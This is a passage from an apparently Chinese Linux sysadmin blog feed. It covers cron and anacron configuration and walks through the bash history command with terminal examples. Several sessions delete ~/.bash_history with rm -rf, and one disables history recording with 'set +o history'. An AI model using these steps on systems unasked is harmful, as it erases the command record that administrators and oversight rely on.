</span>root root<span class="hljs-number"> 392 </span>Aug <span class="hljs-number"> 9 </span><span class="hljs-number"> 2019 </span>0anacron<br></code></pre></td></tr></table></figure><p>cat &#x2F;etc&#x2F;cron.hourly&#x2F;0anacron</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">(base) [root@<span class="hljs-number">110</span> cron]<span class="hljs-comment"># cat /etc/cron.hourly/0anacron</span><br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-comment"># Check whether 0anacron was run today already</span><br><span class="hljs-keyword">if</span> test -r <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/anacron/</span>cron.daily; then<br>    day=`cat <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/anacron/</span>cron.daily`<br>fi<br><span class="hljs-keyword">if</span> [ `date +%Y%m%d` = <span class="hljs-string">&quot;$day&quot;</span> ]; then<br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">0</span>;<br>fi<br><br><span class="hljs-comment"># Do not run jobs when on battery power</span><br><span class="hljs-keyword">if</span> test -x <span class="hljs-regexp">/usr/</span>bin/on_ac_power; then<br>    <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/on_ac_power &gt;/</span>dev/null <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> test $? -eq <span class="hljs-number">1</span>; then<br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">0</span><br>    fi<br>fi<br><span class="hljs-regexp">/usr/</span>sbin/anacron -s<br></code></pre></td></tr></table></figure><p>cat &#x2F;etc&#x2F;anacrontab</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs ruby">(base) [root<span class="hljs-variable">@110</span> cron]<span class="hljs-comment"># cat /etc/anacrontab</span><br><span class="hljs-comment"># /etc/anacrontab: configuration file for anacron</span><br><br><span class="hljs-comment"># See anacron(8) and anacrontab(5) for details.</span><br><br><span class="hljs-variable constant_">SHELL</span>=<span class="hljs-regexp">/bin/sh</span><br><span class="hljs-variable constant_">PATH</span>=<span class="hljs-regexp">/sbin:/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><br><span class="hljs-variable constant_">MAILTO</span>=root<br><span class="hljs-comment"># the maximal random delay added to the base delay of the jobs</span><br><span class="hljs-variable constant_">RANDOM_DELAY</span>=<span class="hljs-number">45</span><br><span class="hljs-comment"># the jobs will be started during the following hours only</span><br><span class="hljs-variable constant_">START_HOURS_RANGE</span>=<span class="hljs-number">3</span>-<span class="hljs-number">22</span><br><br><span class="hljs-comment">#period in days   delay in minutes   job-identifier   command</span><br><span class="hljs-number">1</span>       <span class="hljs-number">5</span>       cron.daily              nice run-parts /etc/cron.daily<br><span class="hljs-number">7</span>       <span class="hljs-number">25</span>      cron.weekly             nice run-parts /etc/cron.weekly<br><span class="hljs-variable">@monthly</span> <span class="hljs-number">45</span>     cron.monthly            nice run-parts /etc/cron.monthly<br></code></pre></td></tr></table></figure><p>cat &#x2F;etc&#x2F;anacrontab</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs ruby">(base) [root<span class="hljs-variable">@110</span> cron]<span class="hljs-comment"># cat /etc/anacrontab</span><br><span class="hljs-comment"># /etc/anacrontab: configuration file for anacron</span><br><br><span class="hljs-comment"># See anacron(8) and anacrontab(5) for details.</span><br><br><span class="hljs-variable constant_">SHELL</span>=<span class="hljs-regexp">/bin/sh</span><br><span class="hljs-variable constant_">PATH</span>=<span class="hljs-regexp">/sbin:/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><br><span class="hljs-variable constant_">MAILTO</span>=root<br><span class="hljs-comment"># the maximal random delay added to the base delay of the jobs</span><br><span class="hljs-variable constant_">RANDOM_DELAY</span>=<span class="hljs-number">45</span><br><span class="hljs-comment"># the jobs will be started during the following hours only</span><br><span class="hljs-variable constant_">START_HOURS_RANGE</span>=<span class="hljs-number">3</span>-<span class="hljs-number">22</span><br><br><span class="hljs-comment">#period in days   delay in minutes   job-identifier   command</span><br><span class="hljs-number">1</span>       <span class="hljs-number">5</span>       cron.daily              nice run-parts /etc/cron.daily<br><span class="hljs-number">7</span>       <span class="hljs-number">25</span>      cron.weekly             nice run-parts /etc/cron.weekly<br><span class="hljs-variable">@monthly</span> <span class="hljs-number">45</span>     cron.monthly            nice run-parts /etc/cron.monthly<br></code></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>crontab -l 无法查看到 &#x2F;etc&#x2F;cron.daily 目录下的定时任务</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>history</title>
    <link href="/2024/04/03/yunwei/commands/history/"/>
    <url>/2024/04/03/yunwei/commands/history/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="命令语法"><a href="#命令语法" class="headerlink" title="命令语法"></a>命令语法</h2><h3 id="history-num-显示指定条数的最新历史记录"><a href="#history-num-显示指定条数的最新历史记录" class="headerlink" title="history num 显示指定条数的最新历史记录"></a>history num 显示指定条数的最新历史记录</h3><p>history num</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history 5<br>  106  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:54:02  ls<br>  107  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:54:07  cat /etc/bashrc<br>  108  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:54:55  vim ~/.bashrc<br>  109  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:55:55  man history<br>  110  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:58:48  history 5<br></code></pre></td></tr></table></figure><h3 id="num-重复执行指定记录"><a href="#num-重复执行指定记录" class="headerlink" title="!num 重复执行指定记录"></a>!num 重复执行指定记录</h3><p>计数都是从1开始的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># history 5</span><br>  113  root 2022-08-14 11:01:48  <span class="hljs-built_in">ls</span><br>  114  root 2022-08-14 11:02:02  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot; 1 &quot;</span> &gt; 1.txt<br>  115  root 2022-08-14 11:02:03  <span class="hljs-built_in">ls</span><br>  116  root 2022-08-14 11:02:08  <span class="hljs-built_in">history</span><br>  117  root 2022-08-14 11:02:15  <span class="hljs-built_in">history</span> 5<br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># !115</span><br><span class="hljs-built_in">ls</span><br>1.txt<br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h3 id="num-从列表末尾开始计数指定第num行命令"><a href="#num-从列表末尾开始计数指定第num行命令" class="headerlink" title="!-num 从列表末尾开始计数指定第num行命令"></a>!-num 从列表末尾开始计数指定第num行命令</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history 10<br>   96  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:02:15  history 5<br>   97  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:02:26  ls<br>   98  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:05:46  history 5<br>   99  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:06:06  history<br>  100  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:06:20  ls<br>  101  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:36  hi<br>  102  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:41  hitory<br>  103  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:44  history<br>  104  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:59  history 6<br>  105  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:08:04  history 10<br>[root@iZbp1191gh7vw52537lyxrZ ~]# !<span class="hljs-string">-6</span><br>ls<br>1.txt<br></code></pre></td></tr></table></figure><h3 id="执行上一条命令"><a href="#执行上一条命令" class="headerlink" title="!! 执行上一条命令"></a>!! 执行上一条命令</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history 10<br>   96  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:02:15  history 5<br>   97  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:02:26  ls<br>   98  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:05:46  history 5<br>   99  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:06:06  history<br>  100  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:06:20  ls<br>  101  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:36  hi<br>  102  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:41  hitory<br>  103  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:44  history<br>  104  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:59  history 6<br>  105  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:08:04  history 10<br>[root@iZbp1191gh7vw52537lyxrZ ~]# !<span class="hljs-string">-6</span><br>ls<br>1.txt<br>[root@iZbp1191gh7vw52537lyxrZ ~]# !!<br>ls<br>1.txt<br></code></pre></td></tr></table></figure><h3 id="string-执行以某字符串开头的最新命令"><a href="#string-执行以某字符串开头的最新命令" class="headerlink" title="!string 执行以某字符串开头的最新命令"></a>!string 执行以某字符串开头的最新命令</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history | grep ls<br>    9  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:32  ls ~/.bash_history  -lat<br>   60  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-12</span> 15:49:47  ls<br>   62  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-12</span> 15:50:11  ls<br>   64  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-12</span> 15:56:38   ls<br>   65  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-12</span> 15:56:41  ls<br>   67  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-12</span> 15:56:45  ls<br>   71  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:41:02  ls<br>   73  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:41:05  ls<br>   76  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:41:19  ls<br>   85  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:54:02  ls<br>   92  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:01:48  ls<br>   94  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:02:03  ls<br>   97  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:02:26  ls<br>  100  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:06:20  ls<br>  106  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:08:22  ls<br>  107  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:11:34  lsls<br>  108  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:11:46  history | grep ls<br>[root@iZbp1191gh7vw52537lyxrZ ~]# !ls<br>lsls<br>-bash: lsls: 未找到命令<br></code></pre></td></tr></table></figure><h3 id="string-p-查找以字符串开头的最新命令"><a href="#string-p-查找以字符串开头的最新命令" class="headerlink" title="!string:p 查找以字符串开头的最新命令"></a>!string:p 查找以字符串开头的最新命令</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span> ~]<span class="hljs-meta"># !ls:p</span><br>lsls<br></code></pre></td></tr></table></figure><h3 id="string-执行包含字符串的最新命令"><a href="#string-执行包含字符串的最新命令" class="headerlink" title="!?string 执行包含字符串的最新命令"></a>!?string 执行包含字符串的最新命令</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history 5<br>  108  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:11:46  history | grep ls<br>  109  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:11:55  lsls<br>  110  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:15:08  pwd aaa<br>  111  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:15:25  pwd a23<br>  112  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:15:36  history 5<br>[root@iZbp1191gh7vw52537lyxrZ ~]# !?a<br>pwd a23<br>/root<br></code></pre></td></tr></table></figure><h3 id="history-d-num-删除指定行记录"><a href="#history-d-num-删除指定行记录" class="headerlink" title="history -d num 删除指定行记录"></a>history -d num 删除指定行记录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span> -d 2<br></code></pre></td></tr></table></figure><h3 id="history-c-清空当前用户当前终端历史记录"><a href="#history-c-清空当前用户当前终端历史记录" class="headerlink" title="history -c 清空当前用户当前终端历史记录"></a>history -c 清空当前用户当前终端历史记录</h3><p>历史记录文件.bash_history文件内容是存在的，新开终端，还是会存在之前的历史记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><br><span class="hljs-built_in">history</span><br><span class="hljs-comment">#1660663206</span><br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cd</span> /<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><h3 id="history-a-追加当前终端新的历史记录到历史记录文件"><a href="#history-a-追加当前终端新的历史记录到历史记录文件" class="headerlink" title="history -a 追加当前终端新的历史记录到历史记录文件"></a>history -a 追加当前终端新的历史记录到历史记录文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">ls</span> test-a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">ls</span> test-b<br><span class="hljs-built_in">ls</span>: 无法访问test-b: 权限不够<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">ls</span> test-a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span> -a<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">ls</span> test-a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">ls</span> test-b<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br></code></pre></td></tr></table></figure><h3 id="history-w-将整个历史记录写入历史记录文件"><a href="#history-w-将整个历史记录写入历史记录文件" class="headerlink" title="history -w 将整个历史记录写入历史记录文件"></a>history -w 将整个历史记录写入历史记录文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">ls</span> test-a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">ls</span> test-b<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span> -a<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span><br>    1  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>    2  <span class="hljs-built_in">history</span><br>    3  <span class="hljs-built_in">ls</span> test-a<br>    4  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    5  <span class="hljs-built_in">history</span> -a<br>    6  <span class="hljs-built_in">history</span><br>    7  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    8  <span class="hljs-built_in">ls</span> test-b<br>    9  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   10  <span class="hljs-built_in">history</span> -a<br>   11  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   12  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>   13  <span class="hljs-built_in">history</span> -a<br>   14  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   15  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>   16  <span class="hljs-built_in">history</span><br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span> -w<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">ls</span> test-a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">ls</span> test-b<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">history</span> -w<br></code></pre></td></tr></table></figure><h3 id="set-o-history-禁止记录历史记录（当前会话生效）"><a href="#set-o-history-禁止记录历史记录（当前会话生效）" class="headerlink" title="set +o history 禁止记录历史记录（当前会话生效）"></a>set +o history 禁止记录历史记录（当前会话生效）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">set</span> +o <span class="hljs-built_in">history</span><br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span><br>    1  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>    2  <span class="hljs-built_in">history</span><br>    3  <span class="hljs-built_in">ls</span> test-a<br>    4  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    5  <span class="hljs-built_in">history</span> -a<br>    6  <span class="hljs-built_in">history</span><br>    7  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    8  <span class="hljs-built_in">ls</span> test-b<br>    9  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   10  <span class="hljs-built_in">history</span> -a<br>   11  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   12  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>   13  <span class="hljs-built_in">history</span> -a<br>   14  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   15  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>   16  <span class="hljs-built_in">history</span><br>   17  <span class="hljs-built_in">history</span> -w<br>   18  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   19  <span class="hljs-built_in">set</span> +o <span class="hljs-built_in">history</span><br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">ls</span> <span class="hljs-built_in">test</span>+ohistory<br><span class="hljs-built_in">ls</span>: 无法访问<span class="hljs-built_in">test</span>+ohistory: 权限不够<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span><br>    1  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>    2  <span class="hljs-built_in">history</span><br>    3  <span class="hljs-built_in">ls</span> test-a<br>    4  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    5  <span class="hljs-built_in">history</span> -a<br>    6  <span class="hljs-built_in">history</span><br>    7  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    8  <span class="hljs-built_in">ls</span> test-b<br>    9  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   10  <span class="hljs-built_in">history</span> -a<br>   11  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   12  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>   13  <span class="hljs-built_in">history</span> -a<br>   14  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   15  <span 